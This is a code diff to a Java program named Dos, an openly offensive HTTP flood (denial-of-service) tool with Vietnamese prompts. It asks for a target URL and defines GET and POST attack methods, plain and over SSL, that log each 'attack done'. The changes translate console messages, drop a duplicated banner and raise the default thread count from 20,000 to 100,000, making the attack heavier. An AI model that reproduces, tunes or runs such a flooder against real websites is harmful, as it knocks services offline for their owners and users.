@@ -46,23 +46,12 @@ public class Dos implements Runnable {
         }
     }
 
-     public static void main(String[] args) throws Exception {   
-   System.out.print(     );
-   System.out.print("DDDDD           SSSSS         TTTTTTT          SSSSS");
-   System.out.println("DD  DD   oooo  SS      xx  xx   TTT   uu   uu SS");
-   System.out.println("DD   DD oo  oo  SSSSS    xx     TTT   uu   uu  SSSSS");
-   System.out.println("DD   DD oo  oo      SS   xx     TTT   uu   uu      SS");
-   System.out.println("DDDDDD   oooo   SSSSS  xx  xx   TTT    uuuu u  SSSSS");
-   System.out.println();
-   System.out.println("               @2022 Copyright : Le Minh Tu & Zalo : 0782554949               "); 
-   System.out.println();        
-
      public static void main(String[] args) throws Exception {
         String url = "";
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("╔═══ Nhập Url: ");
+        System.out.print("╔═══ Nhập Url : ");
         url = in.nextLine();
         System.out.println("\n");
         System.out.println("► Bắt đầu tấn công : " + url);
@@ -76,13 +65,13 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("► Setting DoS By : Le Minh Tu");
+        System.out.println("► @ 2022 Bản quyền: Lê Minh Tú & Zalo: 0782554949");
 
         System.out.print("► Số Luồng : ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 20000;
+            Dos.amount = 100000;
         } else {
             Dos.amount = Integer.parseInt(amount);
         }
@@ -104,7 +93,7 @@ public class Dos implements Runnable {
             }
         }
 
-        Thread.sleep(20000);
+        Thread.sleep(100000);
 
 
         System.out.println("► Bắt Đầu Tấn Công!");
@@ -141,7 +130,7 @@ public class Dos implements Runnable {
     }
 
     private void sslCheckConnection(String url) throws Exception {
-        System.out.println("Checking Connection (ssl)");
+        System.out.println("► Kiểm tra kết nối (SSL)");
         URL obj = new URL(url);
         HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
@@ -149,7 +138,7 @@ public class Dos implements Runnable {
 
         int responseCode = con.getResponseCode();
         if (responseCode == 200) {
-            System.out.println("► Connected to website");
+            System.out.println("► Đã kết nối với trang Web");
         }
         Dos.url = url;
     }
@@ -168,7 +157,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("Tấn Công Thành Công! ┊" + " Code " + responseCode +  " ┊ Số Luồng : " + this.seq);
+        System.out.println("Attack done 亗 ┊" + "Mã số " + responseCode +  " ┊ Số Luồng : " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -178,7 +167,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("Tấn Công Thành Công!┊ "  + " Code " + responseCode + " ┊ Số Luồng : " + this.seq);
+        System.out.println("Attack done 亗 ┊ "  + "Mã số " + responseCode + " ┊ Số Luồng : " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -195,7 +184,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("Tấn Công Thành Công! ┊ " + " Code " + responseCode + " ┊ Số Luồng : " + this.seq);
+        System.out.println("Attack done 亗 ┊ " + "Code " + responseCode + " ┊ Số Luồng : " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -205,6 +194,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("Tấn Công Thành Công! ┊ " + " Code " + responseCode + " ┊ Số Luồng : " + this.seq);
+        System.out.println("Attack done 亗 ┊ " + "Code " + responseCode + " ┊ Số Luồng : " + this.seq);
     }
 }
